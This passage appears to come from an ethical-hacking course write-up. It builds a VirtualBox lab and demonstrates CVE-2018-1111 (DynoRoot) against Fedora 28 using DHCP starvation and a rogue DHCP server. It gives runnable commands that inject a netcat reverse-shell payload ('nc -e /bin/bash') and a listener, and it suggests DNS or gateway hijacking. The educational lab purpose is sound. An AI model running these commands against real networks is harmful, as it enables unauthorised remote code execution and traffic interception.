VBoxManage modifyvm "${VM_NAME}" --vrde off
```

#### SSH Login
```bash
VBoxHeadless --startvm "${VM_NAME}" &
ssh-copy-id -i ~/.ssh/ethhack.pub webserver.ethhack
ssh webserver.ethhack
```

#### Networking
Hostname
```bash
sudo sed 's/server/server server.100waystocook.pizza/' -i /etc/hosts
sudo hostnamectl set-hostname 'server.100waystocook.pizza'
```
-->

### Attacker
The attacker machine has no particular requirement, it needs to run Python in a Conda environment.
We can reuse the ISO from [Ubuntu Server 18.04](https://releases.ubuntu.com/18.04/) for simplicity.

#### VM Creation
Create the VM:
- Network interface 1 connected to the default NAT network of VirtualBox
- Network interface 2 with connected to the `intnet` internal network\
  (the "a" in the MAC address stands for Attacker)
- Port forwarding from a `600x` port on the host to the SSH port in the virtual machine

```bash
VM_NAME="attacker"
VRDE_PORT=5003
SSH_PORT=6003
VM_MAC='08:00:aa:aa:aa:aa'

VBoxManage createvm --name "${VM_NAME}" --ostype Ubuntu_64 --register
VBoxManage modifyvm "${VM_NAME}" \
  --memory 2048 \
  --acpi on \
  --boot1 dvd \
  --nic1 nat \
  --nic2 'intnet' \
  --macaddress2 "${VM_MAC//:/}" \
  --natpf1 "guestssh,tcp,,${SSH_PORT},,22" \
  --audio none

VBoxManage createhd disk --filename "${VM_NAME}.vdi" --size 10000
VBoxManage storagectl "${VM_NAME}" --name "IDE Controller" --add ide --controller PIIX4
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 0 \
  --type hdd \
  --medium "${VM_NAME}.vdi"

VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "$(realpath ubuntu-18.04.5-live-server-amd64.iso)"
```

#### OS Install
The first time we boot the machine we need a virtual desktop to follow the installation steps. We
can start the virtual machine in headless more and use `rdesktop-vrdp` to connect. If VirtualBox is
running on a desktop computer it might be easier to launch the virtual machine from the GUI, but
this method will work even with a remote VirtualBox host.
```bash
VBoxHeadless --startvm "${VM_NAME}" --vrde on --vrdeproperty "TCP/Ports=${VRDE_PORT}" &
sleep 5
rdesktop-vrdp "localhost:${VRDE_PORT}"
kill %%
```

Configuration parameters for the installer:
- Hostname `attacker`
- User `attacker`
- Password `att`
- Set `enp0s8` to use DHCP
- Enable SSH server

<figure style="text-align:center">
  <img src="./media/attacker_user.png" style="max-width:600px;" width="90%"/>
  <figcaption>Installation screenshot: user creation.</figcaption>
</figure>

After installation, shutdown, remove the iso and disable VRDE:
```bash
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "none"
VBoxManage modifyvm "${VM_NAME}" --vrde off
```

#### SSH Login
For ease of access we can install the SSH key created above into the `attacker` machine:
```bash
VBoxHeadless --startvm "${VM_NAME}" &
sleep 5
ssh-copy-id -i ~/.ssh/ethhack.pub attacker.ethhack
ssh attacker.ethhack
```

#### Software dependencies
The python attack scripts need to run as `root` to be able to craft low-level network packages 
using [Scapy](https://github.com/secdev/scapy).
For simplicity, we'll just install all dependencies using the `root` user.
<!-- 
Newest version of NMap (at least `0de714`)
```
apt-get install -y build-essential autoconf
git clone https://github.com/nmap/nmap
pushd nmap
git checkout 0de714
./configure
make
make install
popd

nmap --script broadcast-dhcp-discover --script-args mac=random,timeout=2 -e enp0s8
nmap --script dhcp-discover --script-args dhcptype=DHCPRELEASE,mac=08:00:27:EF:5F:BA -e enp0s8
``` 
-->

[Conda environment](https://docs.conda.io/en/latest/) with Scapy:
```bash
sudo su
cd
wget 'https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh'
chmod u+x Miniconda3-latest-Linux-x86_64.sh
./Miniconda3-latest-Linux-x86_64.sh -b -p ./miniconda
./miniconda/bin/conda init
source .bashrc

conda create -y -n dynoroot python=3.6
conda activate dynoroot
pip install 'scapy[complete]'
```

Next, we'll get the two attack scripts from GitHub:
- **DHCP starvation**\
  This script will flood the benign DHCP with fake requests, 
  exhausting the pool of available addresses.
  ```bash
  git clone 'https://github.com/baldassarreFe/FEP3370-advanced-ethical-hacking'
  ```
- **Rogue DHCP**\
  Once the benign DHCP has ran out of addresses, this script will be ready to hand out DHCP offers
  embedded with the malicious parameter. This script is a modified version of the 
  [original CVE](https://github.com/kkirsche/CVE-2018-1111)):
  ```bash
  git clone 'https://github.com/baldassarreFe/CVE-2018-1111' --branch 'feature/ignore-mac'
  ```

### Fedora Victim
The victim machine is not configured in any particular way, it's just a 
[Fedora 28](https://fedoraproject.org/wiki/Releases/28/Schedule) installation with a vulnerable
NetworkManager.

#### VM Creation
Download the Fedora ISO:
```bash
wget 'https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/28/Server/x86_64/iso/Fedora-Server-dvd-x86_64-28-1.1.iso'
md5sum --check << EOF
18740b445159c54d10bd887650e8d1d7  Fedora-Server-dvd-x86_64-28-1.1.iso
EOF
```

Create the VM:
- Network interface 1 connected to the default NAT network of VirtualBox
- Network interface 2 with connected to the `intnet` internal network\
  (the "f" in the MAC address stands for Fedora)
- Port forwarding from a `600x` port on the host to the SSH port in the virtual machine

```bash
VM_NAME="fedora"
VRDE_PORT=5003
SSH_PORT=6003
VM_MAC='08:00:ff:ff:ff:ff'

VBoxManage createvm --name "${VM_NAME}" --ostype Fedora_64 --register
VBoxManage modifyvm "${VM_NAME}" \
  --memory 2048 \
  --acpi on \
  --boot1 dvd \
  --nic1 nat \
  --nic2 'intnet' \
  --macaddress2 "${VM_MAC//:/}" \
  --natpf1 "guestssh,tcp,,${SSH_PORT},,22" \
  --audio none

VBoxManage createhd disk --filename "${VM_NAME}.vdi" --size 10000
VBoxManage storagectl "${VM_NAME}" --name "IDE Controller" --add ide --controller PIIX4
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 0 \
  --type hdd \
  --medium "${VM_NAME}.vdi"

VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "$(realpath Fedora-Server-dvd-x86_64-28-1.1.iso)"
```

If something goes wrong:
```bash
VBoxManage unregistervm "${VM_NAME}" --delete
```

#### OS Install
The first time we boot the machine we need a virtual desktop to follow the installation steps. We
can start the virtual machine in headless more and use `rdesktop-vrdp` to connect. If VirtualBox is
running on a desktop computer it might be easier to launch the virtual machine from the GUI, but
this method will work even with a remote VirtualBox host.
```bash
VBoxHeadless --startvm "${VM_NAME}" --vrde on --vrdeproperty "TCP/Ports=${VRDE_PORT}" &
sleep 12 # Fedora is slow...
rdesktop-vrdp "localhost:${VRDE_PORT}"
kill %%
```

Install config:
- Hostname `fedora`
- User `victim`
- Password `vic`
- Set `enp0s8` to use DHCP
- SSH server is enabled by default

<figure style="text-align:center">
  <img src="./media/fedora_network.png" style="max-width:600px;" width="90%"/>
  <figcaption>Installation screenshot: network configuration.</figcaption>
</figure>
<figure style="text-align:center">
  <img src="./media/fedora_user.png" style="max-width:600px;" width="90%"/>
  <figcaption>Installation screenshot: user creation.</figcaption>
</figure>

After installation, shutdown, remove the iso and disable VRDE:
```bash
VBoxManage storageattach "${VM_NAME}" \
  --storagectl "IDE Controller" \
  --port 0 \
  --device 1 \
  --type dvddrive \
  --medium "none"
VBoxManage modifyvm "${VM_NAME}" --vrde off
```

#### SSH Login
For ease of access we can install the SSH key created above into the `victim` machine:
```bash
VBoxHeadless --startvm "${VM_NAME}" &
sleep 5
ssh-copy-id -i ~/.ssh/ethhack.pub victim.ethhack
ssh victim.ethhack
```

#### Networking
Check that interface `enp0s8` is using DHCP:
```bash
sudo nmcli device show enp0s8
```

If not, it can be configured using:
```
sudo nmcli connection down   enp0s8
sudo nmcli connection modify enp0s8 IPv4.method auto
sudo nmcli connection modify enp0s8 IPv4.address ''
sudo nmcli connection up     enp0s8
```

To revert to a static IP:
```bash
sudo nmcli connection down   enp0s8
sudo nmcli connection modify enp0s8 IPv4.address 192.168.0.99/24
sudo nmcli connection modify enp0s8 IPv4.method manual
sudo nmcli connection up     enp0s8
```

## Performing the attack

The following steps, executed in order, will showcase the DHCP attack.
We suggest setting up a terminal multiplexer like [Byobu](https://www.byobu.org/) to facilitate 
jumping from one machine to the other.

Before the attack:
1. Spin up the 3 virtual machines, which will automatically connect to the benign DHCP
2. Disconnect the Fedora machine and clean up the DHCP lease files to simulate a fresh connection
3. Restart the DHCP server to simulate a fresh connection

The attack itself consists in:
1. Firing up a series of fake DHCP REQUESTs from the attacker to _starve_ the benign DHCP server
2. Starting the rogue DHCP server that will send the malicious OFFERs to the victim
3. Reconnecting the Fedora machine and waiting for the NetworkManager to broadcas a DHCP DISCOVER
4. Waiting for the reverse shell to connect

If anything happens, stop all relevant services and start over.

### Gateway
Clean up old DHCP leases and the ARP table, then restart the DHCP:
```bash
sudo systemctl stop isc-dhcp-server
sudo rm /var/lib/dhcp/dhcpd.leases*
sudo ip link set arp off dev enp0s8
sudo ip link set arp on dev enp0s8

sudo systemctl start isc-dhcp-server
tail -f /var/log/syslog | grep --line-buffered 'dhcpd' | grep -E 'dhcpd|attacker|fedora|'
```

### Attacker
Get a fresh DHCP lease:
```
sudo dhclient -r enp0s8
sudo dhclient -v enp0s8
```

Record DHCP traffic using `tcpdump`:
```bash
sudo ip link set enp0s8 promisc on
sudo tcpdump -i enp0s8 -w attack.pcap 'arp or icmp or port 67 or port 68'
```

Alternatively, VirtualBox can also record traffic:
```bash
VBoxManage modifyvm "attacker" --nictrace2 on --nictracefile2 capture.pcap
VBoxManage modifyvm "attacker" --nictrace2 off
```

Launch DHCP starvation (run as `root`):
```
sudo su && cd && conda activate dynoroot
python FEP3370-advanced-ethical-hacking/starver.py \
  --interface  enp0s8 \
  --pool-start 192.168.0.100 \
  --pool-end   192.168.0.105
```

Use netcat to listen for connections from the victim:
```
nc -v -l -p 1337
```

Launch attack (run as `root`):
```bash
sudo su && cd && conda activate dynoroot
MY_IP=$(ip -f inet addr show enp0s8 | awk '/inet / {print $2}' | cut -d'/' -f1)
MY_MAC=$(ip link show enp0s8 | awk '/link\/ether / {print $2}' | cut -d'/' -f1)
python CVE-2018-1111/main.py \
  -i enp0s8 \
  -s 192.168.0.0/24 \
  -g 192.168.0.1 \
  -d 'victim.net' \
  -m "${MY_MAC}" \
  -p "nc -e /bin/bash ${MY_IP} 1337"
```

### Victim
Clean up old DHCP leases and reconnect:
```
sudo nmcli connection down enp0s8
sudo find /var/lib/NetworkManager -name 'dhclient-*-enp0s8.lease' -delete

sudo nmcli connection up enp0s8
nmcli
```

### Analysis

#### Video capture
The following video demonstrates the execution of the attack following the steps above.
In the video, it is possible to observe:
1. The 4-way DHCP exchange betweent the `gateway` and the `attacker`
2. The DHCP starvation attack, both in the console of the attacker 
   and in the logs of the DHCP server (note the `NACK` due to the existing lease of the attacker)
3. The "no free leases" message from the `gateway` when the `victim` broadcasts a DHCP `DISCOVER`
4. The crafted DHCP messages of the rogue DHCP server offering `192.168.0.2`
5. The confirmation that netcat has received the reverse shell connection from `192.168.0.2`
6. The fake DNS options received by the `victim`, 
   i.e. DNS address `192.168.0.1` and domain `victim.net`
7. The successful remote code execution of simple commands on the victim machine
8. The DHCP `RELEASE` sent at the end of the attack

<video style="position:relative; left:50%; transform:translateX(-50%); max-width:1400px;" width="90%" controls>
  <source src="./media/dynoroot.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

#### Traffic analysis

The [capture file](./media/attack.pcap) containing the trace of the attack can be analyzed in
[Wireshark](https://wiki.wireshark.org/DHCP). In the capture we can note:
1. The 4-way DHCP exchange betweent the `gateway` and the `attacker`
2. The DHCP starvation attack
3. The DPCH exchange initiated by the `victim` and completed by the `attacker`
4. The ARP _who-has_ requests and replies when the `victim` connected to the netcat session 
   on the `attacker`
<figure style="text-align:center">
  <img src="./media/wireshark.png" style="max-width:800px;" width="90%"/>
  <figcaption>Packet capture of the attack, the DHCP option related to the exploit is highlighted. The letters in the MAC addresses stand for: <code>d</code> DHCP server, <code>a</code> attacker, <code>f</code> Fedora victim</figcaption>
</figure>

## Future work
DynoRoot targets old Fedora and RedHat distributions, and has been patched in more recent releases.
Therefore, the chances of performing this exploit in the wild are limited. Luckily, DHCP attacks are
not limited to remote code execution: any type of crafted option will be accepted by the client
regardless of the presence of the DynoRoot vulnerability. The simplest way to exploit this behavior
is to advertise an attacker-controlled machine as the network gateway or as the DNS for a certain
zone, thus allowing to monitor, inspect and re-route any further traffic.

Another interesting direction regards DHCP starvation attacks. The attack presented in this project
relies on flooding the DHCP server with `REQUESTS` from spoofed MAC addresses, which isn't the
definition of stealthiness. This blog post explores the possibility of 
[performing starvation attacks without sending a single DHCP packet](https://medium.com/bugbountywriteup/dhcp-starvation-attack-without-making-any-dhcp-requests-bef0022133c9) 
but relying instead of spoofed ARP replies.

## Credits
[CVE-2018-1111](https://access.redhat.com/security/vulnerabilities/3442151) was reported to Red Hat
by [Felix Wilhelm](https://twitter.com/_fel1x) from the Google Security Team.

The python script for performing the exploit is from [Kevin Kirsche](https://github.com/kkirsche)'s
GitHub [repository](https://github.com/kkirsche/CVE-2018-1111) with slight modifications to ignore
the attacker's own MAC address.
